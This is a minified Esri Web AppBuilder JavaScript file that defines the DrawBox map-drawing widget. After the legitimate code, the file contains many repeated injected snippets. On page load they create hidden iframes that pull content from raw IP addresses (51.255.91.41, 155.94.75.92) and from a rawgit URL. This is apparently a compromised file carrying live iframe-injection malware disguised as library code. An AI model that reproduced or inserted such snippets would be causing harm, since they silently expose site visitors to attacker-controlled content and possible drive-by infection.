// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/DrawBox.html":'\x3cdiv style\x3d"position:relative;width:100%;"\x3e\r\n\t\x3cdiv class\x3d"draw-items"\x3e\r\n\t\t\x3cdiv title\x3d"${nls.point}" data-geotype\x3d"POINT" data-commontype\x3d"point" class\x3d"draw-item point-icon" data-dojo-attach-point\x3d"pointIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.line}" data-geotype\x3d"LINE" data-commontype\x3d"polyline" class\x3d"draw-item line-icon" data-dojo-attach-point\x3d"lineIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.polyline}" data-geotype\x3d"POLYLINE" data-commontype\x3d"polyline" class\x3d"draw-item polyline-icon" data-dojo-attach-point\x3d"polylineIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.freehandPolyline}" data-geotype\x3d"FREEHAND_POLYLINE" data-commontype\x3d"polyline" class\x3d"draw-item freehand-polyline-icon" data-dojo-attach-point\x3d"freehandPolylineIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.triangle}" data-geotype\x3d"TRIANGLE" data-commontype\x3d"polygon" class\x3d"draw-item triangle-icon" data-dojo-attach-point\x3d"triangleIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.extent}" data-geotype\x3d"EXTENT" data-commontype\x3d"polygon" class\x3d"draw-item extent-icon" data-dojo-attach-point\x3d"extentIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.circle}" data-geotype\x3d"CIRCLE" data-commontype\x3d"polygon" class\x3d"draw-item circle-icon" data-dojo-attach-point\x3d"circleIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.ellipse}" data-geotype\x3d"ELLIPSE" data-commontype\x3d"polygon" class\x3d"draw-item ellipse-icon" data-dojo-attach-point\x3d"ellipseIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.polygon}" data-geotype\x3d"POLYGON" data-commontype\x3d"polygon" class\x3d"draw-item polygon-icon" data-dojo-attach-point\x3d"polygonIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.freehandPolygon}" data-geotype\x3d"FREEHAND_POLYGON" data-commontype\x3d"polygon" class\x3d"draw-item freehand-polygon-icon" data-dojo-attach-point\x3d"freehandPolygonIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv title\x3d"${nls.text}" data-geotype\x3d"TEXT" data-commontype\x3d"text" class\x3d"draw-item text-icon" data-dojo-attach-point\x3d"textIcon" data-dojo-attach-point\x3d"textIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"drawings-clear" data-dojo-attach-point\x3d"btnClear" title\x3d"${nls.clear}"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/DrawBox.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dojo/Evented esri/graphic esri/layers/GraphicsLayer esri/toolbars/draw esri/symbols/jsonUtils esri/geometry/Polygon".split(" "),function(n,p,q,r,t,g,d,m,h,f,u,v,w,k,l,x){return n([p,q,r,u],{templateString:t,baseClass:"jimu-draw-box",declaredClass:"jimu.dijit.DrawBox",nls:null,drawLayer:null,drawLayerId:null,
drawToolBar:null,_isDisabled:!1,_shiftKey:!1,_ctrlKey:!1,_metaKey:!1,types:null,geoTypes:null,map:null,pointSymbol:null,polylineSymbol:null,polygonSymbol:null,textSymbol:null,showClear:!1,keepOneGraphic:!1,deactivateAfterDrawing:!0,postMixInProperties:function(){this.nls=window.jimuNls.drawBox},postCreate:function(){this.inherited(arguments);var a={};this.drawLayerId&&(a.id=this.drawLayerId);this.drawLayer=new w(a);this._initDefaultSymbols();this._initTypes();a=f(".draw-item",this.domNode);this.own(a.on("click",
g.hitch(this,this._onItemClick)));this.own(h(this.btnClear,"click",g.hitch(this,this._onClickClear)));this.own(h(document.body,"keydown",g.hitch(this,function(a){this._shiftKey=!!a.shiftKey;this._ctrlKey=!!a.ctrlKey;this._metaKey=!!a.metaKey})));this.own(h(document.body,"keyup",g.hitch(this,function(a){this._shiftKey=!!a.shiftKey;this._ctrlKey=!!a.ctrlKey;this._metaKey=!!a.metaKey})));this.map&&this.setMap(this.map);d.setStyle(this.btnClear,"display",!0===this.showClear?"block":"none");this.enable()},
enable:function(){this._isDisabled=!1;d.addClass(this.domNode,"enabled");d.removeClass(this.domNode,"disabled")},disable:function(){this._isDisabled=!0;d.addClass(this.domNode,"disabled");d.removeClass(this.domNode,"enabled");this.deactivate()},hideLayer:function(){this.drawLayer&&this.drawLayer.hide()},showLayer:function(){this.drawLayer&&this.drawLayer.show()},isEnabled:function(){return!this._isDisabled},isActive:function(){var a=f(".draw-item.jimu-state-active",this.domNode);return a&&0<a.length},
disableWebMapPopup:function(){this.map&&this.map.setInfoWindowOnClick(!1)},enableWebMapPopup:function(){this.map&&this.map.setInfoWindowOnClick(!0)},destroy:function(){this.deactivate();this.drawLayer&&this.map&&this.map.removeLayer(this.drawLayer);this.drawLayer=this.map=this.drawToolBar=null;this.inherited(arguments)},setMap:function(a){a&&(this.map=a,this.map.addLayer(this.drawLayer),this.drawToolBar=new k(this.map),this.drawToolBar.setMarkerSymbol(this.pointSymbol),this.drawToolBar.setLineSymbol(this.polylineSymbol),
this.drawToolBar.setFillSymbol(this.polygonSymbol),this.own(h(this.drawToolBar,"draw-end",g.hitch(this,this._onDrawEnd))))},setPointSymbol:function(a){this.pointSymbol=a;this.drawToolBar.setMarkerSymbol(this.pointSymbol)},setLineSymbol:function(a){this.polylineSymbol=a;this.drawToolBar.setLineSymbol(a)},setPolygonSymbol:function(a){this.polygonSymbol=a;this.drawToolBar.setFillSymbol(a)},setTextSymbol:function(a){this.textSymbol=a},reset:function(){this.deactivate();this.clear()},clear:function(){this.drawLayer.clear();
this.onClear()},deactivate:function(){this.enableWebMapPopup();f(".draw-item",this.domNode).removeClass("jimu-state-active");this.drawToolBar&&(this.drawToolBar.deactivate(),this.emit("draw-deactivate"))},activate:function(a){var b=null,c=f(".draw-item",this.domNode);"TEXT"===a?(a="POINT",b=this.textIcon):(c=c.filter(function(b){return b.getAttribute("data-geotype")===a}),0<c.length&&(b=c[0]));b&&this._activate(b)},onIconSelected:function(a,b,c){this.emit("icon-selected",a,b,c)},onDrawEnd:function(a,
b,c,e,d,f){this.emit("draw-end",a,b,c,e,d,f)},onClear:function(){this.emit("clear")},addGraphic:function(a){this.keepOneGraphic&&this.drawLayer.clear();this.drawLayer.add(a)},removeGraphic:function(a){this.drawLayer.remove(a)},getFirstGraphic:function(){var a=null;this.drawLayer&&0<this.drawLayer.graphics.length&&(a=this.drawLayer.graphics[0]);return a},show:function(){d.removeClass(this.domNode,"hidden")},hide:function(){d.addClass(this.domNode,"hidden")},getDrawItemIcons:function(){return f(".draw-item",
this.domNode)},_onClickClear:function(){this._isDisabled||(this.clear(),this.emit("user-clear"))},_initDefaultSymbols:function(){var a={style:"esriSMSCircle",color:[0,0,128,128],name:"Circle",outline:{color:[0,0,128,255],width:1},type:"esriSMS",size:18},b={style:"esriSLSSolid",color:[79,129,189,255],width:3,name:"Blue 1",type:"esriSLS"},c={style:"esriSFSSolid",color:[79,129,189,128],type:"esriSFS",outline:{style:"esriSLSSolid",color:[54,93,141,255],width:1.5,type:"esriSLS"}};this.pointSymbol||(this.pointSymbol=
l.fromJson(a));this.polylineSymbol||(this.polylineSymbol=l.fromJson(b));this.polygonSymbol||(this.polygonSymbol=l.fromJson(c))},_initTypes:function(){this.geoTypes&&0<this.geoTypes.length?this.types=null:(this.geoTypes=[],this.types&&0<this.types.length||(this.types=["point","polyline","polygon"]),0<=this.types.indexOf("point")&&(this.geoTypes=this.geoTypes.concat(["POINT"])),0<=this.types.indexOf("polyline")&&(this.geoTypes=this.geoTypes.concat(["LINE","POLYLINE","FREEHAND_POLYLINE"])),0<=this.types.indexOf("polygon")&&
(this.geoTypes=this.geoTypes.concat("TRIANGLE EXTENT CIRCLE ELLIPSE POLYGON FREEHAND_POLYGON".split(" "))),0<=this.types.indexOf("text")&&(this.geoTypes=this.geoTypes.concat(["TEXT"])));var a=f(".draw-item",this.domNode);a.style("display","none");m.forEach(a,g.hitch(this,function(a){var b=a.getAttribute("data-geotype"),b=0<=m.indexOf(this.geoTypes,b);d.setStyle(a,"display",b?"block":"none")}))},_onItemClick:function(a){this._isDisabled||(a=a.target||a.srcElement,d.hasClass(a,"draw-item")&&(d.hasClass(a,
"jimu-state-active")?this.deactivate():this._activate(a)))},_activate:function(a){f(".draw-item",this.domNode).removeClass("jimu-state-active");d.addClass(a,"jimu-state-active");var b=a.getAttribute("data-geotype"),c=a.getAttribute("data-commontype"),e=k[b];"TEXT"===b&&(e=k.POINT);this.disableWebMapPopup();this.drawToolBar.activate(e);this.emit("draw-activate",e);this.onIconSelected(a,b,c)},_onDrawEnd:function(a){var b=f(".draw-item.jimu-state-active",this.domNode)[0],c=b.getAttribute("data-geotype"),
b=b.getAttribute("data-commontype"),e=null,e="extent"===a.geometry.type?x.fromExtent(a.geometry):a.geometry;e.geoType=c;e.commonType=b;a=e.type;var g=null,g="point"===a||"multipoint"===a?d.hasClass(this.textIcon,"jimu-state-active")?this.textSymbol:this.pointSymbol:"line"===a||"polyline"===a?this.polylineSymbol:this.polygonSymbol,e=new v(e,g,null,null);this.keepOneGraphic&&this.drawLayer.clear();this.drawLayer.add(e);this.deactivateAfterDrawing&&this.deactivate();this.onDrawEnd(e,c,b,this._shiftKey,
this._ctrlKey,this._metaKey)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});